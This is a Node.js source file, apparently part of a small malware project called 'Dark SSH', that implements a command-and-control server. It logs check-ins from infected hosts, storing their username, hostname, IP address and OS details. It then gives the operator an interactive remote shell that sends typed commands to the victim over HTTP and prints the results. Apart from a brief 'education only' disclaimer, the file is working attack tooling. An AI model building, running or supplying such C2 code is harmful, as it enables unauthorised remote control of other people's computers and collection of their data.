/**
 * => [: Dark SSH :] <=
 * 
 * Warning: this is for education purpose only and shouldn't be used on a system or computer you don't own.
 * this file contain's a simple c2 server code acting as ssh client.
 */

// import the http module
const http = require('http');

// log ~ Dark SSH ~ to the stdout
console.log("~ Dark SSH ~");

const port = 1146; // replace with your choice if replaced don't forget to update it on the malware.js file.

/**
 * create an osInfo object to store target os info.
 * Note: this osInfo is not used anywhere in the code but just a demonstration on how data can be stored.
 */
const osInfo = {};
// create a variable to hold username
let username = null;
// create a variable to hold operating system
let operatingSystem = null;
// create a variable to hold host
let host = null;
// create a variable to hold target port
let targetPort = null;
// create a variable to hold target ipaddress
let ipaddress = null;

/**
 * create an http server that act like an c2 server.
 * this server check if the ssh server (the target) is live.
 */ 
http.createServer((req, res) => {
	// create a variable to hold request body
	let body = '';
	// create another variable for the payload
	let payload;
	/**
	 * Note: in real world web application server you should handle this properly by checking if the header contains content-type: application/json. 
	 * but this not robust web server but just a simple c2 server.
 	*/
 	// check if method is post
	 if(req.method === 'POST'){
	 	// tell the client everything is ok by the status code 200.
	 	res.writeHead(200);
	 	// end the response immediately.
	 	res.end();
	 	// get request body chunk by chunk.
	 req.on('data', (chunk) => {
	 	// add each chunk to the body variable.
	 	body += chunk.toString();
	 });
	 // once request is complete.
	 req.on('end', () => {
	 	// parse body as payload.
	 	payload = JSON.parse(body);
	 	/**
	 	 * remember about the osInfo variable.
	 	 * storing each object into the osInfo.
 	 	*/
	 	Object.keys(payload['os-info']).forEach(key => {
	 		osInfo[key] = payload['os-info'][key];
	 	});
	 	// extracting username from payload.
	 	username = payload['os-info'].userInfo.username;
	 	// storing the target port to it's variable.
	 	targetPort = payload['target-port'];
	 	// passing the operating system to it's variable.
	 	operatingSystem = payload['operating-system'];
	 	// get hostname from payload.
	 	host = payload['os-info'].hostname;
	 	// get ipaddress from payload.
	 	ipaddress = payload.ipaddress;
	 	/**
	 	 * after everything open remote shell.
	 	 * 
	 	 * Note: this is a custom built function.
	 	 * 
	 	 * call the openShell function.
 	 	*/
	 	openShell();
	 });
	 } else {
	 	// if request method is not POST then status code 400 bad request.
	 	res.writeHead(400);
	 	// end response.
	 	res.end();
	 }
}).listen(port/* port number to listen to  i.e port 1146 */,'0.0.0.0', () => {
	
	// basic logging to indicate the server is running.
	console.log(`\tattack host running on port ${port}`);
	console.log("\twaiting for target response...");
});

// storing standard input as input
 const input = process.stdin;
 // storing standard output as output
 const output = process.stdout;

/**
 * openShell function
 * a custom built function that opens the target shell remotely.
 * no magic here just pure underated method using of stream and http request.
 */
function openShell(){
 // log just for line break
console.log();
// logging a beautiful color header
console.log(centerHeader("=>[:\x1b[1;32m DARK SSH\x1b[0;97m :]<="));
// another line break
console.log();
// a simple dashboard that contains little info about the target.
console.log(`\tRemote-Host: ${host}\t Remote-Port: ${targetPort}\n`);
console.log(`\tRemote-Ipaddress: ${ipaddress}\n`);
console.log(`\tOperating-System: ${operatingSystem}  Remote-Username: ${username}\n\n`);
// ouput the username within the cli
output.write(`[${username}]> `);

// collect input on cli (on terminal) 
input.on('data',  (chunk) => {
	// custom payloadSender function that send command as chunk.
	 paylaodSender(chunk);

});

// a simple function to center the header.
function centerHeader(text) {
	// get terminal width.
  const terminalWidth = process.stdout.columns;
  // mini calculation.
  const padding = Math.floor((terminalWidth - (text.length - 10)) / 2);
  return ' '.repeat(padding) + text;
}

}

/**
 * paylaodSender function.
 * 
 * this usess a simple http post request to the target and ouput the response on stdout.
 */
function paylaodSender(payload) {
 // http request options
 const options = {
      host: ipaddress,
      port: targetPort /* this port is always a random port */,
      path: '/',
      method: 'POST',
      headers: {
      	'content-type': 'application/json'
      }
 }
 
 // make request to target.
var req = http.request(options, (res) => {
	// create a body variable
	let body = '';
	// response on data event handler
	res.on('data', (chunk) => {
	// add each chunk to the body variable.
		body += chunk.toString();
	});
	// once response has ended.
	res.on('end', () => {
		// send body to the stdout.
		output.write(body);
		// and also another prompt.
		output.write(`\n[${username}]> `);
	});
	// handle error
	res.on('error', (error) => {
          throw error;
         });
});

// send payload to target
req.write(payload);
// handle request error
req.on('error', (error) => {
	   // send error to the stdout.
		output.write(`\t\x1b[1;91mHost is Down\x1b[0;97m \n\t${error}`);
		// and also another prompt.
		output.write(`\n[${username}]> `);
});

// don't forget to always end request.
req.end();

}